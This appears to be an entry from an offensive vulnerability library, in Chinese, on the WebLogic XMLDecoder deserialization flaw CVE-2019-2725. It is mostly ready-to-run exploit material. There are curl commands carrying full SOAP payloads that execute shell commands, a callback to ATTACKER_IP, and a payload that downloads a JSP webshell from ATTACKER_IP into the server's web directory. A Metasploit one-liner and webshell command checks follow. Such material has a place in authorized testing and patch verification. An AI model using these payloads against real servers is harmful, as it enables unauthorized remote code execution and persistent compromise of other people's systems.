Vuln/middleware/weblogic/CVE-2019-2725.md

---
id: CVE-2019-2725
title: WebLogic XMLDecoder 反序列化远程代码执行漏洞
product: weblogic
vendor: Oracle
version_affected: "10.3.6, 12.1.3"
severity: CRITICAL
tags: [rce, deserialization, 无需认证]
fingerprint: ["WebLogic", "weblogic", "Oracle WebLogic", "Error 404--Not Found"]
---

## 漏洞描述

WebLogic 的 `/_async/AsyncResponseService` 和 `/wls-wsat/CoordinatorPortType` 接口在处理 SOAP 请求时使用 XMLDecoder 对 XML 数据进行反序列化，攻击者可构造恶意 XML 请求在 WorkContext 中嵌入任意 Java 对象，实现未授权远程代码执行。该漏洞影响 wls9_async_response 和 wls-wsat 两个组件。

## 影响版本

- Oracle WebLogic 10.3.6
- Oracle WebLogic 12.1.3

## 前置条件

- 无需认证
- 目标 WebLogic 启用了 wls9_async_response 组件（`/_async/` 路径可访问）或 wls-wsat 组件（`/wls-wsat/` 路径可访问）
- 需要能够访问 WebLogic 端口（默认 7001）

## 利用步骤

1. 探测目标是否存在 `/_async/AsyncResponseService` 或 `/wls-wsat/CoordinatorPortType` 接口
2. 构造包含恶意 XMLDecoder 序列化数据的 SOAP 请求
3. 通过 POST 请求发送 payload 到目标接口
4. 通过 HTTP 回调或命令回显确认代码执行成功

## Payload

```bash
# 探测 async 组件是否存在
curl -s -o /dev/null -w "%{http_code}" "http://target:7001/_async/AsyncResponseService"

# 探测 wls-wsat 组件是否存在
curl -s -o /dev/null -w "%{http_code}" "http://target:7001/wls-wsat/CoordinatorPortType"

# 通过 /_async/AsyncResponseService 执行命令（使用 HTTP 回调验证）
curl -X POST "http://target:7001/_async/AsyncResponseService" \
  -H "Content-Type: text/xml" \
  -d '
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>curl http://ATTACKER_IP:8080/rce_callback</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body>
    <asy:onAsyncDelivery/>
  </soapenv:Body>
</soapenv:Envelope>'

# 通过 /wls-wsat/CoordinatorPortType 执行命令
curl -X POST "http://target:7001/wls-wsat/CoordinatorPortType" \
  -H "Content-Type: text/xml" \
  -d '
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'

# 写入 webshell 变体
curl -X POST "http://target:7001/_async/AsyncResponseService" \
  -H "Content-Type: text/xml" \
  -d '
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>curl http://ATTACKER_IP:8080/shell.jsp -o servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body>
    <asy:onAsyncDelivery/>
  </soapenv:Body>
</soapenv:Envelope>'
```



Metasploit 利用:
```bash
msfconsole -q -x "use exploit/multi/http/oracle_weblogic_deserialize_badattr; set RHOSTS target; set RPORT 7001; set LHOST attacker_ip; run"
```

## 验证方法

```bash
# 方法1: HTTP 回调验证（推荐）
# 攻击者启动监听: python3 -m http.server 8080
# 发送上述 payload 后检查 HTTP 服务器日志是否有来自目标的请求

# 方法2: 写入 webshell 后访问
curl -s "http://target:7001/_async/shell.jsp?cmd=id" | grep "uid="

# 方法3: 检查接口是否存在（漏洞探测）
curl -s "http://target:7001/_async/AsyncResponseService" | grep -i "async"
curl -s "http://target:7001/wls-wsat/CoordinatorPortType" | grep -i "wsat"
```

## 指纹确认

```bash
curl -s "http://target:7001/_async/AsyncResponseService" | grep -i "async"
curl -s "http://target:7001/wls-wsat/CoordinatorPortType" | grep -i "web service"
curl -s -o /dev/null -w "%{http_code}" "http://target:7001/console/"
```

## 参考链接

- https://www.oracle.com/security-alerts/alert-cve-2019-2725.html
- https://nvd.nist.gov/vuln/detail/CVE-2019-2725
